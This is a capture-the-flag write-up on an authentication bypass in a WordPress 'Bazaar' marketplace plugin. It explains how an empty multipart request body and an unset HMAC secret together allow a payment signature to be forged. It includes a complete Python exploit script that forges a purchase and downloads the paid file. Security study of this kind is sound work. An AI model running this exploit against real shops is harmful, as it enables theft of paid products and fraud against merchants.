---
title: "Bazaar: Authentication Bypass via HMAC Signature Verification Flaw"
description: "Exploiting improper input handling and weak secret initialization to bypass HMAC signature verification in the Bazaar plugin."
date: "2025-12-26"
order: 20
---

# Bazaar: Authentication Bypass via HMAC Signature Verification Flaw

## Introduction

The `Bazaar` plugin for WordPress implements a custom marketplace with a signature-based payment verification system. However, a combination of improper input handling for `multipart/form-data` requests and a weak default secret allows an unauthenticated attacker to bypass the signature check, simulate a payment, and acquire downloadable products (flags) for free.

## Vulnerability Analysis

The vulnerability arises from two distinct issues: the handling of the raw request body in PHP and the default state of the secret key used for HMAC signatures.

### Step 1: Input Handling Discrepancy

The plugin retrieves the request payload using `file_get_contents('php://input')` for signature verification, but uses `$_POST` to process the payment data.

```php
function bazaar_handle_purchase_submission()
{
    $payload = file_get_contents('php://input');
    // ...
    $data = [
        'product_id' => isset($_POST['product_id']) ? ... : 0,
        // ...
    ];

    if (verifyHeader($payload, $sig_header, $secret)) {
        $charge = bazaar_simulate_charge_from_cart($data);
    }
    // ...
}
```

In PHP, `php://input` is not available (returns an empty string) when the request `Content-Type` is `multipart/form-data`. However, `$_POST` is still populated. This allows an attacker to send a `multipart/form-data` request where `$payload` is empty string `""`, while effectively supplying the necessary data in `$_POST`.

### Step 2: Weak Secret Initialization

The signature verification relies on a shared secret stored in the WordPress option `bazaar_secret`.

```php
    if (is_user_logged_in()) {
        $user = get_current_user_id();
        update_option('bazaar_secret', wp_hash_password($user));
    }

    $secret = get_option('bazaar_secret');
```

The secret is only updated if a user is logged in. If no user has ever logged in (or if the attacker attacks before any login event on a fresh instance), `get_option('bazaar_secret')` returns `false` (the default value).

When `false` is passed as the secret key to `hash_hmac`, PHP treats it as an empty string `""`.

### Step 3: Signature Forgery

The `verifyHeader` function constructs the signed payload as `"$timestamp.$payload"`.

```php
    $signedPayload     = "{$timestamp}.{$payload}";
    $expectedSignature = computeSignature($signedPayload, $secret);
```

By combining Step 1 and Step 2, an attacker can send a `multipart/form-data` request. The `$payload` becomes `""`, and the `$secret` is `""`. The attacker simply needs to compute:

```php
$signature = hash_hmac('sha256', "{$timestamp}.", "");
```

This generates a valid signature that the server accepts, bypassing the security check.

## Exploit

To exploit this, we perform the following steps:

1. **Add Product to Cart:** Use a standard WooCommerce request to add the target product (which contains the flag) to the cart.
2. **Forge Payment Request:** Send a `POST` request to `admin-ajax.php?action=bazaar_process_payment` with:
  - `Content-Type: multipart/form-data` (to empty `php://input`).
  - `X-Signature` header containing a signature of `timestamp.` signed with an empty key.
  - Required fields in the body (`product_id`, `price`, etc.) to satisfy validation.
3. **Retrieve Flag:** The server processes the "payment" and creates an order. We follow the redirect or use the `get_bazaar_order` AJAX action with the order key to retrieve the download link for the flag.

### Exploit Script

```python
import requests
import re
import time
import hashlib
import hmac
import json
import sys

# Configuration
BASE_URL = "http://localhost:9100"
PUBLIC_IP = "18.130.76.27"
ADMIN_AJAX = f"{BASE_URL}/wp-admin/admin-ajax.php"

# Create a session
session = requests.Session()

# Helper to handle redirects to the public IP
def safe_get(url):
    try:
        response = session.get(url, allow_redirects=False)
        if response.status_code in [301, 302]:
            location = response.headers['Location']
            if PUBLIC_IP in location:
                location = location.replace(PUBLIC_IP, "localhost")
            return safe_get(location)
        return response
    except Exception as e:
        print(f"Error fetching {url}: {e}")
        return None

def find_product_id():
    print("[*] Finding product ID...")
    # Try shop page
    response = safe_get(f"{BASE_URL}/shop/")
    if response and response.status_code == 200:
        # Regex for add-to-cart link
        match = re.search(r'add-to-cart=(\d+)', response.text)
        if match:
            pid = match.group(1)
            print(f"[+] Found product ID on shop page: {pid}")
            return pid

    print("[-] Product ID not found on shop page. Trying to guess...")
    # Try guessing IDs
    for pid in range(1, 20):
        # Try adding to cart
        print(f"[*] Trying ID {pid}...")
        res = session.get(f"{BASE_URL}/?add-to-cart={pid}", allow_redirects=False)
        # Check if cart cookie is set or updated
        cookies = session.cookies.get_dict()
        # WooCommerce sets 'wp_woocommerce_session_...' cookie
        if any(k.startswith('wp_woocommerce_session_') for k in cookies.keys()):
             print(f"[+] Found valid product ID: {pid}")
             return str(pid)

    print("[-] Could not find product ID.")
    sys.exit(1)

def exploit(product_id):
    print(f"[*] Exploiting with Product ID: {product_id}")

    # 1. Add to cart
    print("[*] Adding to cart...")
    session.get(f"{BASE_URL}/?add-to-cart={product_id}")

    # 2. Prepare Payload
    timestamp = str(int(time.time()))
    payload = "" # Empty for multipart/form-data
    secret = ""  # Empty because option not set

    signed_payload = f"{timestamp}.{payload}"
    signature = hmac.new(secret.encode(), signed_payload.encode(), hashlib.sha256).hexdigest()

    headers = {
        "X-Signature": f"t={timestamp}, v1={signature}"
    }

    data = {
        "product_id": product_id,
        "price": "10",
        "cart_id": "1", # Dummy
        "customer_email": "attacker@example.com",
        "payment_token": "dummy_token"
    }

    files = {
        "dummy": ("dummy.txt", "dummy content") # Force multipart/form-data
    }

    print("[*] Sending signed payment request...")
    response = session.post(
        f"{ADMIN_AJAX}?action=bazaar_process_payment",
        headers=headers,
        data=data,
        files=files,
        allow_redirects=False
    )

    if response.status_code == 302:
        redirect_url = response.headers['Location']
        print(f"[+] Redirected to: {redirect_url}")

        # Extract order key
        match = re.search(r'key=wc_order_([a-zA-Z0-9]+)', redirect_url)
        if match:
            # Full key is usually wc_order_... but the parameter is 'key'
            # Wait, the parameter is 'key=wc_order_5w...'
            # Let's extract the full value of 'key' param
             from urllib.parse import urlparse, parse_qs
             parsed = urlparse(redirect_url)
             qs = parse_qs(parsed.query)
             order_key = qs.get('key', [''])[0]

             print(f"[+] Order Key: {order_key}")
             return order_key
        else:
             print("[-] Could not extract order key from redirect.")
             sys.exit(1)
    else:
        print(f"[-] Unexpected response: {response.status_code}")
        print(response.text)
        sys.exit(1)

def get_flag(order_key):
    print("[*] Retrieving flag...")
    data = {
        "action": "get_bazaar_order",
        "order_key": order_key
    }

    response = session.post(ADMIN_AJAX, data=data)

    if response.status_code == 200:
        try:
            json_resp = response.json()
            if json_resp.get("success"):
                order_data = json_resp.get("data", {})
                items = order_data.get("items", [])
                for item in items:
                    downloads = item.get("downloads", [])
                    for download in downloads:
                        file_url = download.get("file")
                        print(f"[+] Found download link: {file_url}")

                        # Download the file
                        if PUBLIC_IP in file_url:
                            file_url = file_url.replace(PUBLIC_IP, "localhost")

                        file_resp = session.get(file_url)
                        print(f"\n[+] FLAG CONTENT:\n{file_resp.text}")
                        return
            else:
                 print("[-] JSON success is false.")
                 print(json_resp)
        except Exception as e:
            print(f"[-] Error parsing JSON: {e}")
            print(response.text)
    else:
        print(f"[-] Failed to get order details. Status: {response.status_code}")

if __name__ == "__main__":
    pid = find_product_id()
    order_key = exploit(pid)
    get_flag(order_key)
```
